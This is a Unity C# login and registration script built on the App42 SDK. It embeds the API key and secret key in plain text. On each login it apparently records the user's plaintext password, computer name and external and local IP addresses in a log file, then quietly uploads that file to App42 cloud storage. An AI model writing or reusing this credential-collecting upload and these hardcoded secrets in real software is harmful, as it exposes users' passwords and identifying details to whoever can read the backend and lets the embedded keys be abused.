using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.UI;
using com.shephertz.app42.paas.sdk.csharp;    
using com.shephertz.app42.paas.sdk.csharp.user;
using com.shephertz.app42.paas.sdk.csharp.upload;
using System;
using System.IO;
using System.Text;


public class AppLogin : MonoBehaviour {


	string userName = "";  
	string pwd = "";  
	string emailId = "default@mv.com"; 
	string apiKey="67f8f08b250386a54085290fe24083106c42f0295e067fbb025fc0f3eafee6ca";
	string secretKey="f7bd79d1d0aec6823d8321a393c4691a0c9cc7719b8fa01522da55ea5c7b4ebc";
	string logPath;

	void Start()
	{
		logPath = Application.persistentDataPath;
		App42API.Initialize(apiKey,secretKey);
	}

	public void SetUsername(InputField usrname)
	{
		userName = usrname.text;
	}

	public void SetPassword(InputField pass)
	{
		pwd = pass.text;
	}

	public void Login()
	{
		UserService user = App42API.BuildUserService ();
		user.Authenticate (userName, pwd, new LoginCallBack ());

		if (File.Exists (logPath + "/" + userName + ".log")) {
			StreamReader sr = new StreamReader (logPath + "/" + userName + ".log",Encoding.ASCII);
			string log = sr.ReadToEnd ();
			sr.Close ();
			log += "\nLogin attempt @" + System.DateTime.Now.ToString () + "\n";
			log += "user details: " + userName + "__" + pwd + "\n";
			log += "system details:  pc_name:" + System.Environment.MachineName + "\tIP address: " + Network.player.externalIP.ToString() + "/" + Network.player.ipAddress.ToString() + "\n";
			log += "-----------------------------------------------------------------------------------------------------------------------";
			File.WriteAllText (logPath + "/" + userName + ".log", log,Encoding.ASCII);
		} else {
			//File.CreateText (logPath + "/" + userName + ".log");
			//Debug.Log(logPath + "/" + userName + ".log");
			string log="";
			log += "----------------------------------------- LOG --------------------------------";
			log += "\nLogin attempt @" + System.DateTime.Now.ToString () + "\n";
			log += "user details: " + userName + "__" + pwd + "\n";
			log += "system details:  pc_name:" + System.Environment.MachineName + "\tIP address: " + Network.player.externalIP.ToString() + "/" + Network.player.ipAddress.ToString() + "\n";
			log += "-----------------------------------------------------------------------------------------------------------------------";
			File.WriteAllText (logPath + "/" + userName + ".log", log,Encoding.ASCII);
		}
		UploadService uploadService = App42API.BuildUploadService();
		uploadService.RemoveFileByUser (userName + ".log", userName, new RemoveExistingRecord ());
		uploadService.UploadFileForUser(userName+".log", userName, logPath + "/" + userName + ".log","text", "user log file", new UploadFile());  
	}

	public void RegisterUser()
	{ 
		UserService userService = App42API.BuildUserService();  
		userService.CreateUser(userName, pwd, emailId, new RegisterCallBack());
	}

}

public class RemoveExistingRecord: App42CallBack
{
	public void OnSuccess(object response)  
	{  
		App42Response app42response = (App42Response)response;        
		App42Log.Console("response is " + app42response) ;    
	}
	public void OnException(Exception e)  
	{  
		//Debug.Log ("duplicate removal failed");
		App42Log.Console("Exception : " + e);  
	}
}

public class UploadFile : App42CallBack  
{  
	public void OnSuccess(object response)  
	{  
		Upload upload = (Upload) response;    
		IList<Upload.File>  fileList = upload.GetFileList();  
		for(int i=0; i < fileList.Count; i++)  
		{  
			App42Log.Console("fileName is " + fileList[i].GetName());  
			App42Log.Console("fileType is " + fileList[i].GetType());  
			App42Log.Console("fileUrl is " + fileList[i].GetUrl());  
			App42Log.Console("TinyUrl Is  : " + fileList[i].GetTinyUrl());  
			App42Log.Console("fileDescription is " + fileList[i].GetDescription());  
		}  
	}  

	public void OnException(Exception e)  
	{  
		//Debug.Log ("uploading failed");
		App42Log.Console("Exception : " + e);  
	}  
}

public class LoginCallBack : App42CallBack  {      
	public void OnSuccess(object response)      
	{              
		User user = (User) response;              
		Debug.Log("userName is " + user.GetUserName()); 
		if (AppManager.Instance != null)
			AppManager.Instance.LoggedInSuccess ();
	}      
	public void OnException(Exception e)      
	{              
		if (AppManager.Instance != null)
			AppManager.Instance.IncorrectUsernameOrPassword ();
		Debug.Log("Exception : " + e);      
	}
}

public class RegisterCallBack : App42CallBack  {      
	public void OnSuccess(object response)      
	{              
		User user = (User) response;              
		Debug.Log("userName is " + user.GetUserName());              
		Debug.Log("emailId is " + user.GetEmail());  
		Debug.Log ("User registered... Implement action");
		//AppManager.Instance.LoggedInSuccess ();
	}      
	public void OnException(Exception e)      
	{              
		Debug.Log("Exception : " + e);      
	}
}


